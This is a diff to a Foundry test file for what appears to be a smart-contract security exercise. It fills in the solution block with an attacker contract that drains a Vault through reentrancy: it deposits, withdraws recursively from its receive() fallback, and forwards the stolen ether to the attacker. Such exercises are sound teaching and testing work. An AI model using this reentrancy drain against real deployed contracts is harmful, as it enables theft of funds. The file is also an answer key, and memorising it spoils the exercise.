@@ -4,6 +4,29 @@ pragma solidity ^0.8.13;
 import {Test, console} from "forge-std/Test.sol";
 import {Vault} from "../src/02-CallerV2.sol";
 
+contract AttackerContract {
+    Vault public vault;
+    address public owner;
+
+    constructor(address _vault, address _owner) {
+        vault = Vault(_vault);
+        owner = _owner;
+    }
+
+    function attack() payable external {
+        vault.deposit{value: 0.5 ether}();
+        vault.withdraw();
+        payable(owner).transfer(address(this).balance);
+    }
+
+    // Allow contract to receive Ether
+    receive() external payable {
+         if (address(vault).balance > 0) {
+            vault.withdraw();
+        }
+    }
+}
+
 contract CallerV2Test is Test {
     Vault public vault;
 
@@ -22,11 +45,14 @@ contract CallerV2Test is Test {
         vm.startPrank(attacker);
 
         // START OF SOLUTION
-        // (You can create any additional contract if needed)
+        // Deploy the attacker contract
+        AttackerContract attackerContract = new AttackerContract(address(vault),attacker);
 
-        
-
+        // Attack the vault by calling the attack function
+        attackerContract.attack{value: 0.5 ether}();
         // END OF SOLUTION
+
+        vm.stopPrank();
 
         uint256 vaultBalance = address(vault).balance;
         assertEq(vaultBalance, 0, "Vault still has balance");
